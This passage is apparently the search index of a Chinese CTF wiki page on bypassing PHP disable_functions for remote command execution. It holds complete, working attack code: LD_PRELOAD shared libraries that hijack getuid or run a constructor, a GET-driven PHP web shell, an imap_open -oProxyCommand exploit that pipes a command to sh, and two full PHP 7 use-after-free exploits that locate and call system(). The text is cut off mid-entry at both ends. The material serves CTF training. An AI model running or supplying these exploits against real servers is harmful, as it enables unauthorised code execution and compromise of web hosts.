linker\uff09\uff0c\u5b83\u5141\u8bb8\u4f60\u5b9a\u4e49\u5728\u7a0b\u5e8f\u8fd0\u884c\u524d\u4f18\u5148\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u8fd9\u4e2a\u529f\u80fd\u4e3b\u8981\u5c31\u662f\u7528\u6765\u6709\u9009\u62e9\u6027\u7684\u8f7d\u5165\u4e0d\u540c\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u7684\u76f8\u540c\u51fd\u6570\u3002\u901a\u8fc7\u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e3b\u7a0b\u5e8f\u548c\u5176\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4e2d\u95f4\u52a0\u8f7d\u522b\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u751a\u81f3\u8986\u76d6\u6b63\u5e38\u7684\u51fd\u6570\u5e93\u3002\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee5\u6b64\u529f\u80fd\u6765\u4f7f\u7528\u81ea\u5df1\u7684\u6216\u662f\u66f4\u597d\u7684\u51fd\u6570\uff08\u65e0\u9700\u522b\u4eba\u7684\u6e90\u7801\uff09\uff0c\u800c\u53e6\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4ee5\u5411\u522b\u4eba\u7684\u7a0b\u5e8f\u6ce8\u5165\u7a0b\u5e8f\uff0c\u4ece\u800c\u8fbe\u5230\u7279\u5b9a\u7684\u653b\u51fb\u76ee\u7684\u3002 \u6211\u4eec\u901a\u8fc7\u73af\u5883\u53d8\u91cf LD_PRELOAD \u52ab\u6301\u7cfb\u7edf\u51fd\u6570\uff0c\u53ef\u4ee5\u8fbe\u5230\u4e0d\u8c03\u7528 PHP \u7684\u5404\u79cd\u547d\u4ee4\u6267\u884c\u51fd\u6570\uff08system()\u3001exec() \u7b49\u7b49\uff09\u4ecd\u53ef\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u76ee\u7684\u3002","title":"LD_PRELOAD\u7b80\u4ecb"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#_2","text":"mail()\u51fd\u6570\u548cerror_log()\u51fd\u6570\u6240\u8c03\u7528\u7684sendmail\u5df2\u5b89\u88c5 \u4e0d\u9650\u5236 /usr/sbin/sendmail \u7684\u6267\u884c mail()\u51fd\u6570\u548cerror_log()\u51fd\u6570\u6709\u4e00\u4e2a\u672a\u88ab\u7981\u7528","title":"\u5229\u7528\u6761\u4ef6"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#getuid","text":"\u524d\u63d0\u662f\u5728Linux\u4e2d\u5df2\u5b89\u88c5\u5e76\u542f\u7528sendmail\u7a0b\u5e8f\u3002 php\u7684mail()\u51fd\u6570\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u9ed8\u8ba4\u8c03\u7528\u7cfb\u7edf\u7a0b\u5e8f/usr/sbin/sendmail\uff0c\u800c/usr/sbin/sendmail\u4f1a\u8c03\u7528getuid()\u3002\u5982\u679c\u6211\u4eec\u80fd\u901a\u8fc7LD_PRELOAD\u7684\u65b9\u5f0f\u6765\u52ab\u6301getuid()\uff0c\u518d\u7528mail()\u51fd\u6570\u6765\u89e6\u53d1sendmail\u7a0b\u5e8f\u8fdb\u800c\u6267\u884c\u88ab\u52ab\u6301\u7684getuid()\uff0c\u4ece\u800c\u5c31\u80fd\u6267\u884c\u6076\u610f\u4ee3\u7801\u4e86\u3002 \u7f16\u5199\u4e00\u4e2a\u539f\u578b\u4e3a uid_t getuid(void); \u7684 C \u51fd\u6570\uff0c\u5185\u90e8\u6267\u884c\u653b\u51fb\u8005\u6307\u5b9a\u7684\u4ee3\u7801\uff0c\u5e76\u7f16\u8bd1\u6210\u5171\u4eab\u5bf9\u8c61 a.so\uff1b \u8fd0\u884c PHP \u51fd\u6570 putenv()\uff0c\u8bbe\u5b9a\u73af\u5883\u53d8\u91cf LD_PRELOAD \u4e3a a.so\uff0c\u4ee5\u4fbf\u540e\u7eed\u542f\u52a8\u65b0\u8fdb\u7a0b\u65f6\u4f18\u5148\u52a0\u8f7d\u8be5\u5171\u4eab\u5bf9\u8c61\uff1b \u8fd0\u884c PHP \u7684 mail() \u51fd\u6570\uff0cmail() \u5185\u90e8\u542f\u52a8\u65b0\u8fdb\u7a0b /usr/sbin/sendmail\uff0c\u7531\u4e8e\u4e0a\u4e00\u6b65 LD_PRELOAD \u7684\u4f5c\u7528\uff0csendmail \u8c03\u7528\u7684\u7cfb\u7edf\u51fd\u6570 getuid() \u88ab\u4f18\u5148\u7ea7\u66f4\u597d\u7684 a.so \u4e2d\u7684\u540c\u540d getuid() \u6240\u52ab\u6301\uff1b \u8fbe\u5230\u4e0d\u8c03\u7528 PHP \u7684\u5404\u79cd\u547d\u4ee4\u6267\u884c\u51fd\u6570\uff08system()\u3001exec() \u7b49\u7b49\uff09\u4ecd\u53ef\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u76ee\u7684 \u9996\u5148\u7f16\u5199test.c\uff0c\u52ab\u6301getuid()\u51fd\u6570\uff0c\u83b7\u53d6LD_PRELOAD\u73af\u5883\u53d8\u91cf\u5e76\u9884\u52a0\u8f7d\u6076\u610f\u7684\u5171\u4eab\u5e93\uff0c\u518d\u5220\u9664\u73af\u5883\u53d8\u91cf LD_PRELOAD\uff0c\u6700\u540e\u6267\u884c\u7531EVIL_CMDLINE\u73af\u5883\u53d8\u91cf\u83b7\u53d6\u7684\u7cfb\u7edf\u547d\u4ee4 #include <stdlib.h> #include <stdio.h> #include <string.h> int geteuid () { const char * cmdline = getenv ( \"EVIL_CMDLINE\" ); if ( getenv ( \"LD_PRELOAD\" ) == NULL ) { return 0 ; } unsetenv ( \"LD_PRELOAD\" ); system ( cmdline ); } \u5f53\u8fd9\u4e2a\u5171\u4eab\u5e93\u4e2d\u7684getuid()\u88ab\u8c03\u7528\u65f6\uff0c\u5c1d\u8bd5\u52a0\u8f7dpayload()\u51fd\u6570\u6267\u884c\u547d\u4ee4\u3002 \u63a5\u7740\u7528\u4ee5\u4e0b\u8bed\u53e5\u7f16\u8bd1C\u6587\u4ef6\u4e3a\u5171\u4eab\u5bf9\u8c61\u6587\u4ef6\uff1a gcc -shared -fPIC test.c -o test.so \u6700\u540e\u7f16\u5199test.php\uff1a <?php $cmd = $_GET [ \"cmd\" ]; $out_path = $_GET [ \"outpath\" ]; $evil_cmdline = $cmd . \" > \" . $out_path . \" 2>&1\" ; echo \"<p> <b>cmdline</b>: \" . $evil_cmdline . \"</p>\" ; putenv ( \"EVIL_CMDLINE=\" . $evil_cmdline ); $so_path = $_GET [ \"sopath\" ]; putenv ( \"LD_PRELOAD=\" . $so_path ); mail ( \"\" , \"\" , \"\" , \"\" ); echo \"<p> <b>output</b>: <br />\" . nl2br ( file_get_contents ( $out_path )) . \"</p>\" ; unlink ( $out_path ); ?> \u8fd9\u91cc\u63a5\u53d73\u4e2a\u53c2\u6570\uff0c\u4e00\u662fcmd\u53c2\u6570\uff0c\u5f85\u6267\u884c\u7684\u7cfb\u7edf\u547d\u4ee4\uff1b\u4e8c\u662foutpath\u53c2\u6570\uff0c\u4fdd\u5b58\u547d\u4ee4\u6267\u884c\u8f93\u51fa\u7ed3\u679c\u7684\u6587\u4ef6\u8def\u5f84\uff0c\u4fbf\u4e8e\u5728\u9875\u9762\u4e0a\u663e\u793a\uff0c\u53e6\u5916\u8be5\u53c2\u6570\uff0c\u4f60\u5e94\u6ce8\u610fweb\u662f\u5426\u6709\u8bfb\u5199\u6743\u9650\u3001web\u662f\u5426\u53ef\u8de8\u76ee\u5f55\u8bbf\u95ee\u3001\u6587\u4ef6\u5c06\u88ab\u8986\u76d6\u548c\u5220\u9664\u7b49\u51e0\u70b9\uff1b\u4e09\u662fsopath\u53c2\u6570\uff0c\u6307\u5b9a\u52ab\u6301\u7cfb\u7edf\u51fd\u6570\u7684\u5171\u4eab\u5bf9\u8c61\u7684\u7edd\u5bf9\u8def\u5f84\u3002 \u8fd9\u91cc\u901a\u8fc7putenv()\u51fd\u6570\u5c06LD_PRELOAD\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u6076\u610f\u7684test.so\u3001\u5c06\u81ea\u5b9a\u4e49\u7684EVIL_CMDLINE\u73af\u5883\u53d8\u91cf\u8d4b\u503c\u4e3a\u8981\u6267\u884c\u7684\u547d\u4ee4\uff1b\u7136\u540e\u8c03\u7528mail()\u51fd\u6570\u89e6\u53d1sendmail()\uff0c\u518d\u901a\u8fc7sendmail()\u89e6\u53d1getuid()\u4ece\u800c\u4f7f\u6076\u610f\u7684test.so\u88ab\u52a0\u8f7d\u6267\u884c\uff1b\u6700\u540e\u518d\u8f93\u51fa\u5185\u5bb9\u5230\u9875\u9762\u4e0a\u5e76\u5220\u9664\u4e34\u65f6\u5b58\u653e\u547d\u4ee4\u6267\u884c\u7ed3\u679c\u7684\u6587\u4ef6\u3002 \u8bbf\u95eetest.php\uff0c\u8f93\u5165\u76f8\u5e94\u7684\u53c2\u6570\u5373\u53ef\u6267\u884c\u6210\u529f","title":"\u52ab\u6301getuid()"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#_3","text":"\u7b2c\u4e00\u79cd\u65b9\u6cd5\u662f\u52ab\u6301getuid()\uff0c\u662f\u8f83\u4e3a\u5e38\u7528\u7684\u65b9\u6cd5\uff0c\u4f46\u5b58\u5728\u7f3a\u9677\uff1a \u76ee\u6807Linux\u672a\u5b89\u88c5\u6216\u4e3a\u542f\u7528sendmail\uff1b \u5373\u4fbf\u76ee\u6807\u53ef\u4ee5\u542f\u7528sendmail\uff0c\u7531\u4e8e\u672a\u5c06\u4e3b\u673a\u540d\u6dfb\u52a0\u8fdbhosts\u4e2d\uff0c\u5bfc\u81f4\u6bcf\u6b21\u8fd0\u884csendmail\u90fd\u8981\u8017\u65f6\u534a\u5206\u949f\u7b49\u5f85\u57df\u540d\u89e3\u6790\u8d85\u65f6\u8fd4\u56de\uff0cwww-data\u4e5f\u65e0\u6cd5\u5c06\u4e3b\u673a\u540d\u52a0\u5165hosts\uff1b \u7f16\u5199bypass_disablefunc.c #define _GNU_SOURCE #include <stdlib.h> #include <stdio.h> #include <string.h> extern char ** environ ; __attribute__ (( __constructor__ )) void preload ( void ) { // get command line options and arg const char * cmdline = getenv ( \"EVIL_CMDLINE\" ); // unset environment variable LD_PRELOAD. // unsetenv(\"LD_PRELOAD\") no effect on some // distribution (e.g., centos), I need crafty trick. int i ; for ( i = 0 ; environ [ i ]; ++ i ) { if ( strstr ( environ [ i ], \"LD_PRELOAD\" )) { environ [ i ][ 0 ] = '\\0' ; } } // executive command system ( cmdline ); } \u63a5\u7740\u7528\u4ee5\u4e0b\u8bed\u53e5\u7f16\u8bd1C\u6587\u4ef6\u4e3a\u5171\u4eab\u5bf9\u8c61\u6587\u4ef6\uff1a gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so bypass_disablefunc.php\uff0c\u4ee3\u7801\u548ctest.php\u4e00\u81f4\uff1a <?php $cmd = $_GET [ \"cmd\" ]; $out_path = $_GET [ \"outpath\" ]; $evil_cmdline = $cmd . \" > \" . $out_path . \" 2>&1\" ; echo \"<p> <b>cmdline</b>: \" . $evil_cmdline . \"</p>\" ; putenv ( \"EVIL_CMDLINE=\" . $evil_cmdline ); $so_path = $_GET [ \"sopath\" ]; putenv ( \"LD_PRELOAD=\" . $so_path ); mail ( \"\" , \"\" , \"\" , \"\" ); echo \"<p> <b>output</b>: <br />\" . nl2br ( file_get_contents ( $out_path )) . \"</p>\" ; unlink ( $out_path ); ?>","title":"\u52ab\u6301\u542f\u52a8\u8fdb\u7a0b"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#imap_open","text":"\u5b89\u88c5PHP\u7684imap\u6269\u5c55\uff1a apt-get install php-imap \uff1b\u5728php.ini\u4e2d\u5f00\u542fimap.enable_insecure_rsh\u9009\u9879\u4e3aOn\uff1b\u91cd\u542f\u670d\u52a1\u3002 \u6210\u529f\u914d\u7f6e\u597d\u73af\u5883\u540e\uff0c\u5728phpinfo\u4e2d\u4f1a\u770b\u5230\u5982\u4e0b\u4fe1\u606f\uff1a","title":"\u5229\u7528imap_open()\u7ed5\u8fc7"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#_4","text":"PHP \u7684imap_open\u51fd\u6570\u4e2d\u7684\u6f0f\u6d1e\u53ef\u80fd\u5141\u8bb8\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u8be5\u6f0f\u6d1e\u7684\u5b58\u5728\u662f\u56e0\u4e3a\u53d7\u5f71\u54cd\u7684\u8f6f\u4ef6\u7684imap_open\u51fd\u6570\u5728\u5c06\u90ae\u7bb1\u540d\u79f0\u4f20\u9012\u7ed9rsh\u6216ssh\u547d\u4ee4\u4e4b\u524d\u4e0d\u6b63\u786e\u5730\u8fc7\u6ee4\u90ae\u7bb1\u540d\u79f0\u3002\u5982\u679c\u542f\u7528\u4e86rsh\u548cssh\u529f\u80fd\u5e76\u4e14rsh\u547d\u4ee4\u662fssh\u547d\u4ee4\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u5219\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5411\u76ee\u6807\u7cfb\u7edf\u53d1\u9001\u5305\u542b-oProxyCommand\u53c2\u6570\u7684\u6076\u610fIMAP\u670d\u52a1\u5668\u540d\u79f0\u6765\u5229\u7528\u6b64\u6f0f\u6d1e\u3002\u6210\u529f\u7684\u653b\u51fb\u53ef\u80fd\u5141\u8bb8\u653b\u51fb\u8005\u7ed5\u8fc7\u5176\u4ed6\u7981\u7528\u7684exec \u53d7\u5f71\u54cd\u8f6f\u4ef6\u4e2d\u7684\u529f\u80fd\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8fd9\u4e9b\u529f\u80fd\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u6267\u884c\u4efb\u610fshell\u547d\u4ee4\u3002\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u529f\u80fd\u4ee3\u7801\u662fMetasploit Framework\u7684\u4e00\u90e8\u5206\u3002 exp\u5982\u4e0b\uff0c\u5148\u5224\u65ad\u662f\u5426\u5b58\u5728imap_open()\u51fd\u6570\uff0c\u7136\u540e\u6784\u9020exp\u6267\u884c\u901a\u8fc7\u5916\u90e8GET\u8f93\u5165\u7684\u547d\u4ee4\u7136\u540e\u4fdd\u5b58\u7ed3\u679c\u5230\u672c\u5730\u6587\u4ef6\u4e2d\uff0c\u6700\u540e\u8f93\u51fa\u7ed3\u679c\u6587\u4ef6\u5185\u5bb9\uff0c\u6ce8\u610fsleep(5)\u662f\u4e3a\u4e86\u7b49imap_open()\u51fd\u6570\u6267\u884c\u5b8c\u3001\u56e0\u4e3a\u8be5\u51fd\u6570\u6267\u884c\u65f6\u9700\u8981DNS\u8f6e\u8be2\u4f1a\u5b58\u5728\u5ef6\u65f6\uff1a <?php error_reporting ( 0 ); if ( ! function_exists ( 'imap_open' )) { die ( \"no imap_open function!\" ); } $server = \"x -oProxyCommand=echo \\t \" . base64_encode ( $_GET [ 'cmd' ] . \">/tmp/cmd_result\" ) . \"|base64 \\t -d|sh}\" ; //$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . \">/tmp/cmd_result\") . '|base64$IFS$()-d|sh}'; imap_open ( '{' . $server . ':143/imap}INBOX' , '' , '' ); // or var_dump(\"\\n\\nError: \".imap_last_error()); sleep ( 5 ); echo file_get_contents ( \"/tmp/cmd_result\" ); ?> \u5f53\u7136\uff0c\u66ff\u6362\u7a7a\u683c\u7b26\u7684\\t\u4e5f\u53ef\u4ee5\u6362\u6210 $IFS$() \u6765Bypass\u6389\u3002","title":"\u57fa\u672c\u539f\u7406"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#php-json-bypass","text":"7.1 - all versions to date 7.2 < 7.2.19 (released: 30 May 2019) 7.3 < 7.3.6 (released: 30 May 2019) <?php # \u8fd9\u91cc\u4fee\u6539\u4f60\u7684\u547d\u4ee4 $cmd = \"id\" ; $n_alloc = 10 ; # increase this value if you get segfaults class MySplFixedArray extends SplFixedArray { public static $leak ; } class Z implements JsonSerializable { public function write ( & $str , $p , $v , $n = 8 ) { $i = 0 ; for ( $i = 0 ; $i < $n ; $i ++ ) { $str [ $p + $i ] = chr ( $v & 0xff ); $v >>= 8 ; } } public function str2ptr ( & $str , $p = 0 , $s = 8 ) { $address = 0 ; for ( $j = $s - 1 ; $j >= 0 ; $j -- ) { $address <<= 8 ; $address |= ord ( $str [ $p + $j ]); } return $address ; } public function ptr2str ( $ptr , $m = 8 ) { $out = \"\" ; for ( $i = 0 ; $i < $m ; $i ++ ) { $out .= chr ( $ptr & 0xff ); $ptr >>= 8 ; } return $out ; } # unable to leak ro segments public function leak1 ( $addr ) { global $spl1 ; $this -> write ( $this -> abc , 8 , $addr - 0x10 ); return strlen ( get_class ( $spl1 )); } # the real deal public function leak2 ( $addr , $p = 0 , $s = 8 ) { global $spl1 , $fake_tbl_off ; # fake reference zval $this -> write ( $this -> abc , $fake_tbl_off + 0x10 , 0xdeadbeef ); # gc_refcounted $this -> write ( $this -> abc , $fake_tbl_off + 0x18 , $addr + $p - 0x10 ); # zval $this -> write ( $this -> abc , $fake_tbl_off + 0x20 , 6 ); # type (string) $leak = strlen ( $spl1 :: $leak ); if ( $s != 8 ) { $leak %= 2 << ( $s * 8 ) - 1 ; } return $leak ; } public function parse_elf ( $base ) { $e_type = $this -> leak2 ( $base , 0x10 , 2 ); $e_phoff = $this -> leak2 ( $base , 0x20 ); $e_phentsize = $this -> leak2 ( $base , 0x36 , 2 ); $e_phnum = $this -> leak2 ( $base , 0x38 , 2 ); for ( $i = 0 ; $i < $e_phnum ; $i ++ ) { $header = $base + $e_phoff + $i * $e_phentsize ; $p_type = $this -> leak2 ( $header , 0 , 4 ); $p_flags = $this -> leak2 ( $header , 4 , 4 ); $p_vaddr = $this -> leak2 ( $header , 0x10 ); $p_memsz = $this -> leak2 ( $header , 0x28 ); if ( $p_type == 0x6474e552 ) { # PT_GNU_RELRO # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr ; $data_size = $p_memsz ; } else if ( $p_type == 1 && $p_flags == 5 ) { # PT_LOAD, PF_Read_exec $text_size = $p_memsz ; } } if ( ! $data_addr || ! $text_size || ! $data_size ) return false ; return [ $data_addr , $text_size , $data_size ]; } public function get_basic_funcs ( $base , $elf ) { list ( $data_addr , $text_size , $data_size ) = $elf ; for ( $i = 0 ; $i < $data_size / 8 ; $i ++ ) { $leak = $this -> leak2 ( $data_addr , $i * 8 ); if ( $leak - $base > 0 && $leak - $base < $text_size ) { $deref = $this -> leak2 ( $leak ); # 'constant' constant check if ( $deref != 0x746e6174736e6f63 ) continue ; } else continue ; $leak = $this -> leak2 ( $data_addr , ( $i + 4 ) * 8 ); if ( $leak - $base > 0 && $leak - $base < $text_size ) { $deref = $this -> leak2 ( $leak ); # 'bin2hex' constant check if ( $deref != 0x786568326e6962 ) continue ; } else continue ; return $data_addr + $i * 8 ; } } public function get_binary_base ( $binary_leak ) { $base = 0 ; $start = $binary_leak & 0xfffffffffffff000 ; for ( $i = 0 ; $i < 0x1000 ; $i ++ ) { $addr = $start - 0x1000 * $i ; $leak = $this -> leak2 ( $addr , 0 , 7 ); if ( $leak == 0x10102464c457f ) { # ELF header return $addr ; } } } public function get_system ( $basic_funcs ) { $addr = $basic_funcs ; do { $f_entry = $this -> leak2 ( $addr ); $f_name = $this -> leak2 ( $f_entry , 0 , 6 ); if ( $f_name == 0x6d6574737973 ) { # system return $this -> leak2 ( $addr + 8 ); } $addr += 0x20 ; } while ( $f_entry != 0 ); return false ; } public function jsonSerialize () { global $y , $cmd , $spl1 , $fake_tbl_off , $n_alloc ; $contiguous = []; for ( $i = 0 ; $i < $n_alloc ; $i ++ ) $contiguous [] = new DateInterval ( 'PT1S' ); $room = []; for ( $i = 0 ; $i < $n_alloc ; $i ++ ) $room [] = new Z (); $_protector = $this -> ptr2str ( 0 , 78 ); $this -> abc = $this -> ptr2str ( 0 , 79 ); $p = new DateInterval ( 'PT1S' ); unset ( $y [ 0 ]); unset ( $p ); $protector = \". $_protector \" ; $x = new DateInterval ( 'PT1S' ); $x -> d = 0x2000 ; $x -> h = 0xdeadbeef ; # $this->abc is now of size 0x2000 if ( $this -> str2ptr ( $this -> abc ) != 0xdeadbeef ) { die ( 'UAF failed.' ); } $spl1 = new MySplFixedArray (); $spl2 = new MySplFixedArray (); # some leaks $class_entry = $this -> str2ptr ( $this -> abc , 0x120 ); $handlers = $this -> str2ptr ( $this -> abc , 0x128 ); $php_heap = $this -> str2ptr ( $this -> abc , 0x1a8 ); $abc_addr = $php_heap - 0x218 ; # create a fake class_entry $fake_obj = $abc_addr ; $this -> write ( $this -> abc , 0 , 2 ); # type $this -> write ( $this -> abc , 0x120 , $abc_addr ); # fake class_entry # copy some of class_entry definition for ( $i = 0 ; $i < 16 ; $i ++ ) { $this -> write ( $this -> abc , 0x10 + $i * 8 , $this -> leak1 ( $class_entry + 0x10 + $i * 8 )); } # fake static members table $fake_tbl_off = 0x70 * 4 - 16 ; $this -> write ( $this -> abc , 0x30 , $abc_addr + $fake_tbl_off ); $this -> write ( $this -> abc , 0x38 , $abc_addr + $fake_tbl_off ); # fake zval_reference $this -> write ( $this -> abc , $fake_tbl_off , $abc_addr + $fake_tbl_off + 0x10 ); # zval $this -> write ( $this -> abc , $fake_tbl_off + 8 , 10 ); # zval type (reference) # look for binary base $binary_leak = $this -> leak2 ( $handlers + 0x10 ); if ( ! ( $base = $this -> get_binary_base ( $binary_leak ))) { die ( \"Couldn't determine binary base address\" ); } # parse elf header if ( ! ( $elf = $this -> parse_elf ( $base ))) { die ( \"Couldn't parse ELF\" ); } # get basic_functions address if ( ! ( $basic_funcs = $this -> get_basic_funcs ( $base , $elf ))) { die ( \"Couldn't get basic_functions address\" ); } # find system entry if ( ! ( $zif_system = $this -> get_system ( $basic_funcs ))) { die ( \"Couldn't get zif_system address\" ); } # copy hashtable offsetGet bucket $fake_bkt_off = 0x70 * 5 - 16 ; $function_data = $this -> str2ptr ( $this -> abc , 0x50 ); for ( $i = 0 ; $i < 4 ; $i ++ ) { $this -> write ( $this -> abc , $fake_bkt_off + $i * 8 , $this -> leak2 ( $function_data + 0x40 * 4 , $i * 8 )); } # create a fake bucket $fake_bkt_addr = $abc_addr + $fake_bkt_off ; $this -> write ( $this -> abc , 0x50 , $fake_bkt_addr ); for ( $i = 0 ; $i < 3 ; $i ++ ) { $this -> write ( $this -> abc , 0x58 + $i * 4 , 1 , 4 ); } # copy bucket zval $function_zval = $this -> str2ptr ( $this -> abc , $fake_bkt_off ); for ( $i = 0 ; $i < 12 ; $i ++ ) { $this -> write ( $this -> abc , $fake_bkt_off + 0x70 + $i * 8 , $this -> leak2 ( $function_zval , $i * 8 )); } # pwn $this -> write ( $this -> abc , $fake_bkt_off + 0x70 + 0x30 , $zif_system ); $this -> write ( $this -> abc , $fake_bkt_off , $fake_bkt_addr + 0x70 ); $spl1 -> offsetGet ( $cmd ); exit (); } } $y = [ new Z ()]; json_encode ([ & $y ]);","title":"php-json-bypass"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#php7-gc-bypass","text":"PHP 7.0-7.3 disable_functions bypass PoC (*nix only) <?php # PHP 7.0-7.3 disable_functions bypass PoC (*nix only) # # Bug: https://bugs.php.net/bug.php?id=72530 # # This exploit should work on all PHP 7.0-7.3 versions # # Author: https://github.com/mm0r1 pwn ( \"uname -a\" ); function pwn ( $cmd ) { global $abc , $helper ; function str2ptr ( & $str , $p = 0 , $s = 8 ) { $address = 0 ; for ( $j = $s - 1 ; $j >= 0 ; $j -- ) { $address <<= 8 ; $address |= ord ( $str [ $p + $j ]); } return $address ; } function ptr2str ( $ptr , $m = 8 ) { $out = \"\" ; for ( $i = 0 ; $i < $m ; $i ++ ) { $out .= chr ( $ptr & 0xff ); $ptr >>= 8 ; } return $out ; } function write ( & $str , $p , $v , $n = 8 ) { $i = 0 ; for ( $i = 0 ; $i < $n ; $i ++ ) { $str [ $p + $i ] = chr ( $v & 0xff ); $v >>= 8 ; } } function leak ( $addr , $p = 0 , $s = 8 ) { global $abc , $helper ; write ( $abc , 0x68 , $addr + $p - 0x10 ); $leak = strlen ( $helper -> a ); if ( $s != 8 ) { $leak %= 2 << ( $s * 8 ) - 1 ; } return $leak ; } function parse_elf ( $base ) { $e_type = leak ( $base , 0x10 , 2 ); $e_phoff = leak ( $base , 0x20 ); $e_phentsize = leak ( $base , 0x36 , 2 ); $e_phnum = leak ( $base , 0x38 , 2 ); for ( $i = 0 ; $i < $e_phnum ; $i ++ ) { $header = $base + $e_phoff + $i * $e_phentsize ; $p_type = leak ( $header , 0 , 4 ); $p_flags = leak ( $header , 4 , 4 ); $p_vaddr = leak ( $header , 0x10 ); $p_memsz = leak ( $header , 0x28 ); if ( $p_type == 1 && $p_flags == 6 ) { # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr ; $data_size = $p_memsz ; } else if ( $p_type == 1 && $p_flags == 5 ) { # PT_LOAD, PF_Read_exec $text_size = $p_memsz ; } } if ( ! $data_addr || ! $text_size || ! $data_size ) return false ; return [ $data_addr , $text_size , $data_size ]; } function get_basic_funcs ( $base , $elf ) { list ( $data_addr , $text_size , $data_size ) = $elf ; for ( $i = 0 ; $i < $data_size / 8 ; $i ++ ) { $leak = leak ( $data_addr , $i * 8 ); if ( $leak - $base > 0 && $leak - $base < $data_addr - $base ) { $deref = leak ( $leak ); # 'constant' constant check if ( $deref != 0x746e6174736e6f63 ) continue ; } else continue ; $leak = leak ( $data_addr , ( $i + 4 ) * 8 ); if ( $leak - $base > 0 && $leak - $base < $data_addr - $base ) { $deref = leak ( $leak ); # 'bin2hex' constant check if ( $deref != 0x786568326e6962 ) continue ; } else continue ; return $data_addr + $i * 8 ; } } function get_binary_base ( $binary_leak ) { $base = 0 ; $start = $binary_leak & 0xfffffffffffff000 ; for ( $i = 0 ; $i < 0x1000 ; $i ++ ) { $addr = $start - 0x1000 * $i ; $leak = leak ( $addr , 0 , 7 ); if ( $leak == 0x10102464c457f ) { # ELF header return $addr ; } } } function get_system ( $basic_funcs ) { $addr = $basic_funcs ; do { $f_entry = leak ( $addr ); $f_name = leak ( $f_entry , 0 , 6 ); if ( $f_name == 0x6d6574737973 ) { # system return leak ( $addr + 8 ); } $addr += 0x20 ; } while ( $f_entry != 0 ); return false ; } class ryat { var $ryat ; var $chtg ; function __destruct () { $this -> chtg = $this -> ryat ; $this -> ryat = 1 ; } } class Helper { public $a , $b , $c , $d ; } if ( stristr ( PHP_OS , 'WIN' )) { die ( 'This PoC is for *nix systems only.' ); } $n_alloc = 10 ; # increase this value if you get segfaults $contiguous = []; for ( $i = 0 ; $i < $n_alloc ; $i ++ ) $contiguous [] = str_repeat ( 'A' , 79 ); $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\"ryat\":2:{s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;}}i:1;i:3;i:2;R:5;}' ; $out = unserialize ( $poc ); gc_collect_cycles (); $v = []; $v [ 0 ] = ptr2str ( 0 , 79 ); unset ( $v ); $abc = $out [ 2 ][ 0 ]; $helper = new Helper ; $helper -> b = function ( $x ) { }; if ( strlen ( $abc ) == 79 || strlen ( $abc ) == 0 ) { die ( \"UAF failed\" ); } # leaks $closure_handlers = str2ptr ( $abc , 0 ); $php_heap = str2ptr ( $abc , 0x58 ); $abc_addr = $php_heap - 0xc8 ; # fake value write ( $abc , 0x60 , 2 ); write ( $abc , 0x70 , 6 ); # fake reference write ( $abc , 0x10 , $abc_addr + 0x60 ); write ( $abc , 0x18 , 0xa ); $closure_obj = str2ptr ( $abc , 0x20 ); $binary_leak = leak ( $closure_handlers , 8 ); if ( ! ( $base = get_binary_base ( $binary_leak ))) { die ( \"Couldn't determine binary base address\" ); } if ( ! ( $elf = parse_elf ( $base ))) { die ( \"Couldn't parse ELF header\" ); } if ( ! ( $basic_funcs = get_basic_funcs ( $base , $elf ))) { die ( \"Couldn't get basic_functions address\" ); } if ( ! ( $zif_system = get_system ( $basic_funcs ))) { die ( \"Couldn't get zif_system address\" ); } # fake closure object $fake_obj_offset = 0xd0 ; for ( $i = 0 ; $i < 0x110 ; $i += 8 ) { write ( $abc , $fake_obj_offset + $i , leak ( $closure_obj , $i )); } # pwn write ( $abc , 0x20 , $abc_addr + $fake_obj_offset ); write ( $abc , 0xd0 + 0x38 , 1 , 4 ); # internal func type write ( $abc , 0xd0 + 0x68 , $zif_system ); # internal func handler ( $helper -> b )( $cmd ); exit (); }","title":"php7-gc-bypass"},{"location":"CTFWiki/Web/RCE/\u7ed5\u8fc7disable_functions/#php-fpm-disable_functions","text":"","title":"\u653b\u51fb PHP-FPM \u7ed5\u8fc7 